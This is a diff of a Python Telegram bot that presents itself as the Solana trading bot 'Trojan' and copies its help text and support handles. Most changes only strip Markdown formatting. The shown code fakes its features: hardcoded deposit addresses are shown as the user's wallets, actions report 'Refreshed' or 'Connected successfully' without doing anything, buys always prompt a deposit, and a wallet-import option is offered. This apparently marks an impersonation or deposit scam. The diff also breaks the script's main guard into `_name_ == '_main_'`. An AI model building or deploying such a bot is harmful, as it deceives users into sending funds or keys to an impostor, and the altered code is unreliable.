@@ -764,7 +773,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("0.5 SOL", callback_data="buy_0.5_sol"), InlineKeyboardButton("1 SOL", callback_data="buy_1_sol")],
             [InlineKeyboardButton("3 SOL", callback_data="buy_3_sol"), InlineKeyboardButton("5 SOL", callback_data="buy_5_sol")],
             [InlineKeyboardButton("10 SOL", callback_data="buy_10_sol"), InlineKeyboardButton("20 SOL", callback_data="buy_20_sol")],
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
@@ -776,11 +785,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Handle specific buy actions
         keyboard = [
             [InlineKeyboardButton("Wallet", callback_data="wallet")],
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            f"❌ *Insufficient balance to complete the purchase.*\n\n"
+            f"❌ Insufficient balance to complete the purchase.\n\n"
             f"Please make a deposit to proceed.",
             reply_markup=reply_markup,
             parse_mode="Markdown"
@@ -790,24 +799,24 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         wallet_keyboard = [
             [InlineKeyboardButton("Import Solana Wallet", callback_data="import_wallet"), InlineKeyboardButton("Delete Wallet", callback_data="delete_wallet")],
             [InlineKeyboardButton("Label Wallet", callback_data="label_wallet"), InlineKeyboardButton("🔄 Refresh", callback_data="refresh_wallet")],
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(wallet_keyboard)
         await query.edit_message_text(
-            "🔐 *Wallet Options:*\n\n"
-            "💳 *Solana Wallet Address:*\n`6dyzT3kVsy27bPomXcKuLSPNXzreYqF2KiNM2HopZBXy`\n"
-            "💳 *Label:* W1 . ✅\n"
-            "💼 *Balance:* 0.00 SOL\n\n"
-            "💳 *Ethereum Wallet Address:*\n`0x5FA54dDe52cc1cCDa8A0a951c47523293c17a970`\n"
-            "💳 *Label:* W1 . ✅\n"
-            "💼 *Balance:* 0.00 ETH\n",
+            "🔐 Wallet Options:\n\n"
+            "💳 Solana Wallet Address:\n`6dyzT3kVsy27bPomXcKuLSPNXzreYqF2KiNM2HopZBXy`\n"
+            "💳 Label: W1 . ✅\n"
+            "💼 Balance: 0.00 SOL\n\n"
+            "💳 Ethereum Wallet Address:\n`0x5FA54dDe52cc1cCDa8A0a951c47523293c17a970`\n"
+            "💳 Label: W1 . ✅\n"
+            "💼 Balance: 0.00 ETH\n",
             parse_mode="Markdown",
             reply_markup=reply_markup
         )
     elif action == "positions":
         # Handle Positions button
         keyboard = [
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
@@ -818,7 +827,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif action == "sell":
         # Handle Sell button
         keyboard = [
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
@@ -846,7 +855,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif action == "buy_settings":
         # Ask for Buy Slippage
         await query.edit_message_text(
-            "⚙️ *Buy Settings*\n\n"
+            "⚙ Buy Settings\n\n"
             "Please input the slippage percentage for buying (e.g., 0.5 for 0.5%):",
             parse_mode="Markdown"
         )
@@ -855,7 +864,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif action == "sell_settings":
         # Ask for Sell Slippage
         await query.edit_message_text(
-            "⚙️ *Sell Settings*\n\n"
+            "⚙ Sell Settings\n\n"
             "Please input the slippage percentage for selling (e.g., 0.5 for 0.5%):",
             parse_mode="Markdown"
         )
@@ -866,11 +875,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [
             [InlineKeyboardButton("Buy Settings", callback_data="buy_settings"), InlineKeyboardButton("Sell Settings", callback_data="sell_settings")],
             [InlineKeyboardButton("Set Referral", callback_data="set_referral"), InlineKeyboardButton("Confirm Trades", callback_data="confirm_trades")],
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "⚙️ *Settings Menu*\n\n"
+            "⚙ Settings Menu\n\n"
             "Select an option below:",
             reply_markup=reply_markup,
             parse_mode="Markdown"
@@ -879,11 +888,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif action == "dca_orders":
         # Handle DCA Orders button
         keyboard = [
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "📊 *DCA Orders*\n\n"
+            "📊 DCA Orders\n\n"
             "You currently have no active DCA orders.",
             reply_markup=reply_markup,
             parse_mode="Markdown"
@@ -909,11 +918,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [
             [InlineKeyboardButton("Create Limit Order", callback_data="create_limit_order")],
             [InlineKeyboardButton("View Active Orders", callback_data="view_active_orders")],
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "📈 *Limit Orders Menu*\n\n"
+            "📈 Limit Orders Menu\n\n"
             "Select an option below:",
             reply_markup=reply_markup,
             parse_mode="Markdown"
@@ -922,10 +931,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif action == "create_limit_order":
         # Ask the user to input details for the limit order
         await query.edit_message_text(
-            "📝 *Create Limit Order*\n\n"
+            "📝 Create Limit Order\n\n"
             "Please provide the token symbol, price, and amount for the limit order in the following format:\n"
-            "`<TOKEN_SYMBOL> <PRICE> <AMOUNT>`\n\n"
-            "Example: `SOL 25 10` (to buy 10 SOL at $25 each).",
+            "<TOKEN_SYMBOL> <PRICE> <AMOUNT>\n\n"
+            "Example: SOL 25 10 (to buy 10 SOL at $25 each).",
             parse_mode="Markdown"
         )
         return ASK_LIMIT_ORDER_DETAILS
@@ -935,21 +944,21 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         active_orders = context.user_data.get("active_orders", [])
         if not active_orders:
             await query.edit_message_text(
-                "📋 *Active Limit Orders*\n\n"
+                "📋 Active Limit Orders\n\n"
                 "You currently have no active limit orders.",
                 parse_mode="Markdown"
             )
         else:
             orders_text = "\n".join([f"🔹 {order}" for order in active_orders])
             await query.edit_message_text(
-                f"📋 *Active Limit Orders*\n\n{orders_text}",
+                f"📋 Active Limit Orders\n\n{orders_text}",
                 parse_mode="Markdown"
             )
 
     elif action == "label_wallet":
         # Handle Label Wallet
         await query.edit_message_text(
-            "📝 *Label Wallet*\n\n"
+            "📝 Label Wallet\n\n"
             "Please provide a label for your wallet (e.g., 'Main Wallet', 'Savings Wallet').",
             parse_mode="Markdown"
         )
@@ -958,7 +967,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif action == "delete_wallet":
         # Handle Delete Wallet (Dormant)
         await query.edit_message_text(
-            "❌ *Delete Wallet*\n\n"
+            "❌ Delete Wallet\n\n"
             "This feature is currently closed.",
             parse_mode="Markdown"
         )
@@ -966,7 +975,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif action == "refresh_wallet":
         # Handle Refresh Wallet (Dormant)
         await query.edit_message_text(
-            "🔄 *Refresh Wallet*\n\n"
+            "🔄 Refresh Wallet\n\n"
             "Refreshed.",
             parse_mode="Markdown"
         )
@@ -975,11 +984,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Handle Withdraw button (same as /withdraw command)
         keyboard = [
             [InlineKeyboardButton("Wallet", callback_data="wallet")],
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "❌ *Zero balance.*\n\n"
+            "❌ Zero balance.\n\n"
             "Please deposit funds to proceed.",
             reply_markup=reply_markup,
             parse_mode="Markdown"
@@ -988,24 +997,24 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif action == "help":
         # Handle Help button (same as /help command)
         help_text = (
-            "📖 *How do I use Trojan?*\n"
+            "📖 How do I use Trojan?\n"
             "Check out our [Youtube playlist](https://www.youtube.com/@TrojanOnSolana) where we explain it all and join our support chat for additional resources @trojan.\n\n"
-            "📌 *Where can I find my referral code?*\n"
+            "📌 Where can I find my referral code?\n"
             "Open the /start menu and click 💰Referrals.\n\n"
-            "💰 *What are the fees for using Trojan?*\n"
+            "💰 What are the fees for using Trojan?\n"
             "Successful transactions through Trojan incur a fee of 0.9%, if you were referred by another user. We don't charge a subscription fee or pay-wall any features.\n\n"
-            "🔒 *Security Tips: How can I protect my account from scammers?*\n"
+            "🔒 Security Tips: How can I protect my account from scammers?\n"
             " - Safeguard does NOT require you to login with a phone number or QR code!\n"
             " - NEVER search for bots in Telegram. Use only official links.\n"
             " - Admins and Mods NEVER dm first or send links, stay safe!\n\n"
             "For an additional layer of security, setup your Secure Action Password (SAP) in the Settings menu. Once set up, you'll use this password to perform any sensitive action like withdrawing funds, exporting your keys, or deleting a wallet. Your SAP is not recoverable once set, please set a hint to facilitate your memory.\n\n"
-            "📊 *Trading Tips: Common Failure Reasons*\n"
+            "📊 Trading Tips: Common Failure Reasons\n"
             " - Slippage Exceeded: Up your slippage or sell in smaller increments.\n"
             " - Insufficient balance for buy amount + gas: Add SOL or reduce your tx amount.\n"
             " - Timed out: Can occur with heavy network loads, consider increasing your gas tip.\n\n"
-            "📈 *My PNL seems wrong, why is that?*\n"
+            "📈 My PNL seems wrong, why is that?\n"
             "The net profit of a trade takes into consideration the trade's transaction fees. Confirm your gas tip settings and ensure your settings align with your trading size. You can confirm the details of your trade on Solscan.io to verify the net profit.\n\n"
-            "❓ *Additional questions or need support?*\n"
+            "❓ Additional questions or need support?\n"
             "Join our Telegram group @trojan and one of our admins can assist you."
         )
         await query.edit_message_text(
@@ -1017,7 +1026,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif action == "refresh":
         # Handle Refresh button
         await query.edit_message_text(
-            "🔄 *Your balance and data have been refreshed.*",
+            "🔄 Your balance and data have been refreshed.",
             parse_mode="Markdown"
         )
 
@@ -1031,7 +1040,7 @@ async def handle_copy_trade_address(update: Update, context: ContextTypes.DEFAUL
     context.user_data["copy_trade_address"] = address
     logger.info(f"Copy trade address entered: {address}")  # Log the address for debugging
     await update.message.reply_text(
-        f"✅ *Connected successfully to address:* `{address}`\n\n"
+        f"✅ Connected successfully to address: {address}\n\n"
         "You are now copying trades from this user.",
         parse_mode="Markdown"
     )
@@ -1042,7 +1051,7 @@ async def handle_buy_slippage(update: Update, context: ContextTypes.DEFAULT_TYPE
     slippage = update.message.text.strip()
     if not slippage.replace('.', '', 1).isdigit():
         await update.message.reply_text(
-            "❌ *Invalid input.*\n\n"
+            "❌ Invalid input.\n\n"
             "Please provide a valid slippage percentage (e.g., 0.5 for 0.5%).",
             parse_mode="Markdown"
         )
@@ -1050,7 +1059,7 @@ async def handle_buy_slippage(update: Update, context: ContextTypes.DEFAULT_TYPE
 
     context.user_data["buy_slippage"] = slippage
     await update.message.reply_text(
-        f"✅ *Buy slippage recorded:* {slippage}%\n\n"
+        f"✅ Buy slippage recorded: {slippage}%\n\n"
         "Slippage has been set successfully.",
         parse_mode="Markdown"
     )
@@ -1061,7 +1070,7 @@ async def handle_sell_slippage(update: Update, context: ContextTypes.DEFAULT_TYP
     slippage = update.message.text.strip()
     if not slippage.replace('.', '', 1).isdigit():
         await update.message.reply_text(
-            "❌ *Invalid input.*\n\n"
+            "❌ Invalid input.\n\n"
             "Please provide a valid slippage percentage (e.g., 0.5 for 0.5%).",
             parse_mode="Markdown"
         )
@@ -1069,7 +1078,7 @@ async def handle_sell_slippage(update: Update, context: ContextTypes.DEFAULT_TYP
 
     context.user_data["sell_slippage"] = slippage
     await update.message.reply_text(
-        f"✅ *Sell slippage recorded:* {slippage}%\n\n"
+        f"✅ Sell slippage recorded: {slippage}%\n\n"
         "Slippage has been set successfully.",
         parse_mode="Markdown"
     )
@@ -1082,7 +1091,7 @@ async def handle_sniper_action(update: Update, context: ContextTypes.DEFAULT_TYP
     # Validate the sniper input
     if not sniper_input:
         await update.message.reply_text(
-            "❌ *Invalid input.*\n\n"
+            "❌ Invalid input.\n\n"
             "Please provide a valid sniper action or token address.",
             parse_mode="Markdown"
         )
@@ -1091,7 +1100,7 @@ async def handle_sniper_action(update: Update, context: ContextTypes.DEFAULT_TYP
     # Save the sniper input
     context.user_data["sniper_action"] = sniper_input
     await update.message.reply_text(
-        f"✅ *Sniper action recorded:* `{sniper_input}`\n\n"
+        f"✅ Sniper action recorded: {sniper_input}\n\n"
         "You can now proceed with your sniper action.",
         parse_mode="Markdown"
     )
@@ -1113,7 +1122,7 @@ async def handle_limit_order_details(update: Update, context: ContextTypes.DEFAU
         context.user_data["active_orders"].append(order)
 
         await update.message.reply_text(
-            f"✅ *Limit Order Created:*\n\n"
+            f"✅ Limit Order Created:\n\n"
             f"🔹 {amount} {token_symbol} at ${price}\n\n"
             "You can view your active orders in the Limit Orders menu.",
             parse_mode="Markdown"
@@ -1121,10 +1130,10 @@ async def handle_limit_order_details(update: Update, context: ContextTypes.DEFAU
         return ConversationHandler.END
     except ValueError:
         await update.message.reply_text(
-            "❌ *Invalid input format.*\n\n"
+            "❌ Invalid input format.\n\n"
             "Please provide the token symbol, price, and amount in the following format:\n"
-            "`<TOKEN_SYMBOL> <PRICE> <AMOUNT>`\n\n"
-            "Example: `SOL 25 10` (to buy 10 SOL at $25 each).",
+            "<TOKEN_SYMBOL> <PRICE> <AMOUNT>\n\n"
+            "Example: SOL 25 10 (to buy 10 SOL at $25 each).",
             parse_mode="Markdown"
         )
         return ASK_LIMIT_ORDER_DETAILS
@@ -1136,7 +1145,7 @@ async def handle_wallet_label(update: Update, context: ContextTypes.DEFAULT_TYPE
     # Validate the label (optional)
     if not label:
         await update.message.reply_text(
-            "❌ *Invalid label.*\n\n"
+            "❌ Invalid label.\n\n"
             "Please provide a valid label for your wallet.",
             parse_mode="Markdown"
         )
@@ -1149,13 +1158,13 @@ async def handle_wallet_label(update: Update, context: ContextTypes.DEFAULT_TYPE
 
     # Confirm the label to the user
     await update.message.reply_text(
-        f"✅ *Wallet labeled as:* {label}\n\n"
+        f"✅ Wallet labeled as: {label}\n\n"
         "You can now use this label to identify your wallet.",
         parse_mode="Markdown"
     )
     return ConversationHandler.END
 
-if __name__ == '__main__':
+if _name_ == '_main_':
     app = ApplicationBuilder().token(BOT_TOKEN).build()
 
     conv_handler = ConversationHandler(
